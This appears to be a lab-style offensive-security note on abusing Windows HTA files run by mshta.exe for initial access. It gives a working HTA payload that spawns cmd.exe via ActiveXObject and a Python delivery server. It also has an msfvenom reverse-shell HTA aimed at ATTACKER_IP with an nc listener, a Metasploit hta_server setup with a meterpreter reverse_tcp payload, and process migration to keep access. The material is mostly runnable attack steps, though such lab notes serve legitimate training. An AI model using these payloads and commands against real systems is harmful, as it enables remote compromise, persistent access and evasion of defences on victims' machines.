HTA files are an ***executable HTML file (.hta)*** that runs as a standalone applications which ***execute using the same technologies as Internet Explorer***, but without the strict security model and UI of a browser. This means that if not altered or disabled, ***this file extension can be run on double click (through `mshta.exe`) as a fully trusted application***, with higher privileges than a normal HTML document.

It is useful for ***execution, persistence, and defence evasion*** because they run outside the browser security sandbox with full system permissions since `mshta.exe` executes outside of Internet Explorer.

It allows you to ***create a downloadable file that contains display and rendering information*** often using `JScript` and `VBScript`. The LOLBINS tool `mshta` executes HTA files. It can be executed by itself or automatically from Internet Explorer.

##### Example to Execute `cmd.exe` using `ActiveXObject` in our Payload
**Attacker's Machine**
```
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

**Start the Python Web Server**
```
python3 -m http.server 8080
```

**Victim's Machine**
In the URL:
```
http://IP:8080/payload.hta
```

---
### HTA Reverse Connection
Create a reverse shell payload:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f hta-psh -o thm.hta 
```

Once the victim visits the malicious URL and hits run, we get the connection back:
```
nc -nvlp PORT
```

---
### Malicious HTA via Metasploit
Under the exploit section in Metasploit:
```
use exploit/windows/misc/hta_server
set LHOST IP
set LPORT PORT
set SRVHOST ATTACKER_IP
set payload windows/meterpreter/reverse_tcp
exploit
```

Metasploit will produce an URL: `hxxp://10.10.87.206:8080/wRp2H1eOFjx.hta`. 

**Interact with the Meterpreter Session**
```
sessions -i 1
```

---
#### Migrate Process
We need to migrate into another process to make the ***connection stable if the application is closed***.
```
meterpreter > run post/windows/manage/migrate
```
